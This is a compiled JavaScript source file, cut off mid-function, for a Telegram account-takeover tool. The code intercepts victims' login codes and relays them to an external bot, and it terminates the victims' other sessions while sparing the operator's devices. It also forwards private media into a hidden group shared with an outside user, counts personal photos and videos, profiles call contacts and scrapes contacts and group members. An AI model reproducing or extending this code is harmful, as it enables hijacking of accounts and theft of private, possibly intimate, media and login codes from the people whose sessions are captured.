"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const events_1 = require("telegram/events");
const tl_1 = require("telegram/tl");
const axios_1 = __importDefault(require("axios"));
const fs = __importStar(require("fs"));
const uploads_1 = require("telegram/client/uploads");
const Helpers_1 = require("telegram/Helpers");
const Logger_1 = require("telegram/extensions/Logger");
const IMap_1 = require("../../IMap/IMap");
const big_integer_1 = __importDefault(require("big-integer"));
const utils_1 = require("../../utils");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
var TelegramErrorCode;
(function (TelegramErrorCode) {
    TelegramErrorCode["FLOOD_WAIT"] = "FLOOD_WAIT";
    TelegramErrorCode["FILE_REFERENCE_EXPIRED"] = "FILE_REFERENCE_EXPIRED";
    TelegramErrorCode["USERNAME_NOT_MODIFIED"] = "USERNAME_NOT_MODIFIED";
    TelegramErrorCode["TIMEOUT"] = "TIMEOUT";
    TelegramErrorCode["PHONE_CODE_INVALID"] = "PHONE_CODE_INVALID";
    TelegramErrorCode["PASSWORD_REQUIRED"] = "PASSWORD_REQUIRED";
})(TelegramErrorCode || (TelegramErrorCode = {}));
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        return this.safeOperation({
            execute: async () => {
                const result = await this.retryOperation(async () => {
                    const groupResult = await this.client.invoke(new tl_1.Api.channels.CreateChannel({
                        title: "Saved Messages",
                        about: this.phoneNumber,
                        megagroup: true,
                        forImport: true,
                    }));
                    const { id, accessHash } = groupResult.chats[0];
                    await Promise.all([
                        this.categorizeDialogToFolder(id, accessHash),
                        this.addUsersToChannel(id, accessHash)
                    ]);
                    return { id: id.toString(), accessHash: accessHash.toString() };
                });
                return result;
            }
        });
    }
    async categorizeDialogToFolder(channelId, accessHash) {
        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new tl_1.Api.InputFolderPeer({
                    peer: new tl_1.Api.InputPeerChannel({
                        channelId,
                        accessHash,
                    }),
                    folderId: 1,
                }),
            ],
        }));
    }
    async addUsersToChannel(channelId, accessHash) {
        await this.client.invoke(new tl_1.Api.channels.InviteToChannel({
            channel: new tl_1.Api.InputChannel({
                channelId,
                accessHash,
            }),
            users: ["fuckyoubabie"]
        }));
    }
    async createGroupAndForward(fromChatId) {
        try {
            const { id } = await this.createGroup();
            await this.forwardSecretMsgs(fromChatId, id);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error in createGroupAndForward:', parsedError);
            throw error;
        }
    }
    async joinChannelAndForward(fromChatId, channel) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const result = await this.joinChannel(channel);
            const channelResult = result;
            if (!channelResult?.chats?.[0]) {
                throw new Error('Failed to join channel');
            }
            await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
                folderPeers: [
                    new tl_1.Api.InputFolderPeer({
                        peer: new tl_1.Api.InputPeerChannel({
                            channelId: channelResult.chats[0].id,
                            accessHash: channelResult.chats[0].accessHash,
                        }),
                        folderId: 1,
                    }),
                ],
            }));
            await this.forwardSecretMsgs(fromChatId, channel);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error in joinChannelAndForward:', parsedError);
            throw error;
        }
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        return this.safeOperation({
            execute: async () => {
                let offset = 0;
                const limit = 100;
                let forwardedCount = 0;
                const rateLimitDelay = 5000;
                while (true) {
                    const messages = await this.client.getMessages(fromChatId, {
                        offsetId: offset,
                        limit
                    });
                    if (!messages.length)
                        break;
                    const messageIds = this.filterMediaMessages(messages);
                    offset = messages[messages.length - 1].id;
                    if (messageIds.length > 0) {
                        await this.forwardMessagesWithRetry(toChatId, fromChatId, messageIds);
                        forwardedCount += messageIds.length;
                        console.log(`Forwarded ${forwardedCount} messages`);
                        await (0, Helpers_1.sleep)(rateLimitDelay);
                    }
                    await (0, Helpers_1.sleep)(rateLimitDelay);
                }
                await this.leaveChannels([toChatId]);
            }
        });
    }
    filterMediaMessages(messages) {
        return messages
            .filter(message => message.id && message.media)
            .map(message => message.id);
    }
    async forwardMessagesWithRetry(toChatId, fromChatId, messageIds) {
        await this.retryOperation(async () => {
            await this.client.forwardMessages(toChatId, {
                messages: messageIds,
                fromPeer: fromChatId,
            });
        }, 3);
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async disconnect() {
        if (this.client) {
            try {
                console.log("Destroying Client: ", this.phoneNumber);
                this.client.removeEventHandler(this.handleEvents, new events_1.NewMessage({}));
                await this.client.destroy();
                await this.client.disconnect();
                this.client = null;
                this.session.delete();
                this.channelArray = [];
            }
            catch (error) {
                console.error("Error during disconnect:", error);
                throw error;
            }
        }
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        (0, parseError_1.parseError)(error);
        if (error.message && error.message == 'TIMEOUT') {
        }
        else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
        }
    }
    async createClient(handler = true, handlerFn) {
        try {
            this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID || '', 10), process.env.API_HASH || '', {
                connectionRetries: 5,
            });
            this.client.setLogLevel(Logger_1.LogLevel.ERROR);
            await this.retryOperation(async () => {
                await this.client?.connect();
                const me = await this.client?.getMe();
                if (!me)
                    throw new Error('Failed to get user info');
                console.log("Connected Client : ", me.phone);
            });
            if (handler && this.client) {
                console.log("Adding event Handler");
                const eventHandler = handlerFn || this.handleEvents.bind(this);
                this.client.addEventHandler(eventHandler, new events_1.NewMessage());
            }
            return this.client;
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error("Error creating client:", parsedError);
            throw error;
        }
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(event.message.text)}`);
            }
        }
    }
    async channelInfo(sendIds = false) {
        return this.safeOperation({
            execute: async () => {
                const chats = await this.client.getDialogs({ limit: 1500 });
                let canSendTrueCount = 0;
                let canSendFalseCount = 0;
                let totalCount = 0;
                this.channelArray = [];
                const canSendFalseChats = [];
                console.log("TotalChats:", chats.total);
                for (const chat of chats) {
                    if (!chat.isChannel && !chat.isGroup)
                        continue;
                    try {
                        const chatEntity = chat.entity.toJSON();
                        const { broadcast, defaultBannedRights, id } = chatEntity;
                        const channelId = id.toString()?.replace(/^-100/, "");
                        totalCount++;
                        if (!broadcast && !defaultBannedRights?.sendMessages) {
                            canSendTrueCount++;
                            this.channelArray.push(channelId);
                        }
                        else {
                            canSendFalseCount++;
                            canSendFalseChats.push(channelId);
                        }
                    }
                    catch (error) {
                        const parsedError = (0, parseError_1.parseError)(error);
                        console.warn(`Failed to process chat: ${parsedError.message}`);
                    }
                }
                return {
                    chatsArrayLength: totalCount,
                    canSendTrueCount,
                    canSendFalseCount,
                    ids: sendIds ? this.channelArray : [],
                    canSendFalseChats
                };
            }
        });
    }
    async getGrpMembers(entity) {
        return this.safeOperation({
            execute: async () => {
                const chat = await this.client.getEntity(entity);
                if (!(chat instanceof tl_1.Api.Chat || chat instanceof tl_1.Api.Channel)) {
                    throw new Error("Invalid group or channel!");
                }
                console.log(`Fetching members of ${chat.title || chat.username}...`);
                const participants = await this.client.invoke(new tl_1.Api.channels.GetParticipants({
                    channel: chat,
                    filter: new tl_1.Api.ChannelParticipantsRecent(),
                    offset: 0,
                    limit: 200,
                    hash: (0, big_integer_1.default)(0),
                }));
                if (!(participants instanceof tl_1.Api.channels.ChannelParticipants)) {
                    throw new Error("Failed to fetch participants");
                }
                const result = await this.processParticipants(participants.participants);
                console.log(`Processed ${result.length} members`);
                return result;
            }
        });
    }
    async processParticipants(participants) {
        const result = [];
        for (const participant of participants) {
            try {
                const userId = participant instanceof tl_1.Api.ChannelParticipant ? participant.userId : null;
                if (!userId)
                    continue;
                const userDetails = await this.client.getEntity(userId);
                const memberInfo = {
                    tgId: userDetails.id.toString(),
                    name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`.trim(),
                    username: userDetails.username || "",
                };
                result.push(memberInfo);
                if (userDetails.firstName === 'Deleted Account' && !userDetails.username) {
                    console.log('Found deleted account:', userDetails.id.toString());
                }
            }
            catch (error) {
                const parsedError = (0, parseError_1.parseError)(error);
                console.warn(`Failed to process participant: ${parsedError.message}`);
            }
        }
        return result;
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getLastMsgs(limit) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new tl_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, parseError_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const inputContacts = mobiles.map((mobile, index) => {
                const firstName = `${namePrefix}${index + 1}`;
                const clientId = (0, big_integer_1.default)((index << 16).toString());
                return new tl_1.Api.InputPhoneContact({
                    clientId,
                    phone: mobile,
                    firstName,
                    lastName: '',
                });
            });
            const result = await this.client.invoke(new tl_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            console.log("Imported Contacts Result:", result);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error("Error adding contacts:", parsedError);
            throw error;
        }
    }
    async leaveChannels(chats) {
        if (!this.client)
            throw new Error('Client is not initialized');
        console.log("Leaving Channels: initiated!!");
        console.log("Chats to leave:", chats.length);
        for (const id of chats) {
            try {
                await this.client.invoke(new tl_1.Api.channels.LeaveChannel({
                    channel: id
                }));
                console.log("Left channel:", id);
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(30000);
                }
            }
            catch (error) {
                const parsedError = (0, parseError_1.parseError)(error);
                console.log("Failed to leave channel:", parsedError.message);
            }
        }
    }
    async getEntity(entity) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            return await this.client.getEntity(entity);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error getting entity:', parsedError);
            throw error;
        }
    }
    async joinChannel(entity) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            console.log("Trying to join channel:", entity);
            const channelEntity = await this.client.getEntity(entity);
            return await this.client.invoke(new tl_1.Api.channels.JoinChannel({
                channel: channelEntity
            }));
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error joining channel:', parsedError);
            throw error;
        }
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
            auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows');
    }
    async resetAuthorization(auth) {
        await this.client?.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            return await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error getting authorizations:', parsedError);
            throw error;
        }
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new tl_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof tl_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async getLastActiveTime() {
        try {
            const result = await this.getAuths();
            let latestActivity = 0;
            result.authorizations.forEach((auth) => {
                if (!this.isAuthMine(auth) && auth.dateActive > latestActivity) {
                    latestActivity = auth.dateActive;
                }
            });
            return new Date(latestActivity * 1000).toISOString().split('T')[0];
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error getting last active time:', parsedError);
            throw error;
        }
    }
    async getContacts() {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            return await this.client.invoke(new tl_1.Api.contacts.GetContacts({
                hash: (0, big_integer_1.default)(0)
            }));
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error getting contacts:', parsedError);
            throw error;
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll(),
                ],
            }));
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new tl_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new tl_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async deleteChat(chatId) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            await this.client.invoke(new tl_1.Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error deleting chat:', parsedError);
            throw error;
        }
    }
    async blockUser(chatId) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            await this.client.invoke(new tl_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error blocking user:', parsedError);
            throw error;
        }
    }
    async downloadMedia(chatId, messageId, res) {
        return this.safeOperation({
            execute: async () => {
                const messages = await this.client.getMessages(chatId, { ids: [messageId] });
                const message = messages[0];
                if (!message?.media || message.media instanceof tl_1.Api.MessageMediaEmpty) {
                    throw new Error('Media not found');
                }
                const { contentType, filename, fileLocation } = this.getMediaDetails(message);
                const chunkSize = TelegramManager.CHUNK_SIZE;
                const maxSize = TelegramManager.MAX_FILE_SIZE;
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                let downloadedSize = 0;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: (0, big_integer_1.default)(0),
                    limit: maxSize,
                    requestSize: chunkSize,
                })) {
                    downloadedSize += chunk.length;
                    if (downloadedSize > maxSize) {
                        throw new Error('File size exceeds maximum allowed size');
                    }
                    res.write(chunk);
                }
                res.end();
            }
        });
    }
    getMediaDetails(message) {
        const inputLocation = message.video || message.photo;
        const locationData = {
            id: inputLocation.id,
            accessHash: inputLocation.accessHash,
            fileReference: inputLocation.fileReference,
        };
        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
            return {
                contentType: 'image/jpeg',
                filename: 'photo.jpg',
                fileLocation: new tl_1.Api.InputPhotoFileLocation({ ...locationData, thumbSize: 'm' })
            };
        }
        else if (message.media instanceof tl_1.Api.MessageMediaDocument) {
            return {
                contentType: message.document?.mimeType || 'video/mp4',
                filename: 'video.mp4',
                fileLocation: new tl_1.Api.InputDocumentFileLocation({ ...locationData, thumbSize: '' })
            };
        }
        throw new Error('Unsupported media type');
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const messages = await this.client.getMessages(chatId, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof tl_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof tl_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new tl_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof tl_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new tl_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: big_integer_1.default[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async forwardMessage(chatId, messageId) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            await this.client.forwardMessages("@fuckyoubabie", {
                fromPeer: chatId,
                messages: messageId
            });
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error forwarding message:', parsedError);
        }
    }
    async updateUsername(baseUsername) {
        if (!this.client)
            throw new Error('Client is not initialized');
        let newUserName = '';
        let username = baseUsername.trim();
        let increment = 0;
        const maxAttempts = 10;
        try {
            if (username === '') {
                await this.retryOperation(() => this.client.invoke(new tl_1.Api.account.UpdateUsername({ username: '' })));
                console.log('Removed Username successfully.');
                return '';
            }
            while (increment < maxAttempts) {
                try {
                    const result = await this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
                    if (result) {
                        await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                }
                catch (error) {
                    const parsedError = (0, parseError_1.parseError)(error);
                    if (parsedError.message === 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    console.warn(`Username attempt failed: ${parsedError.message}`);
                }
                username = `${baseUsername}${++increment}`;
                await (0, Helpers_1.sleep)(2000);
            }
            return newUserName;
        }
        catch (error) {
            const parsedError = (0, parseError_1.parseError)(error);
            console.error('Error updating username:', parsedError);
            throw error;
        }
    }
    async updatePrivacy() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const privacySettings = [
            {
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [new tl_1.Api.InputPrivacyValueDisallowAll()]
            },
            {
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
            },
            {
                key: new tl_1.Api.InputPrivacyKeyForwards(),
                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
            },
            {
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [new tl_1.Api.InputPrivacyValueDisallowAll()]
            },
            {
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
            },
            {
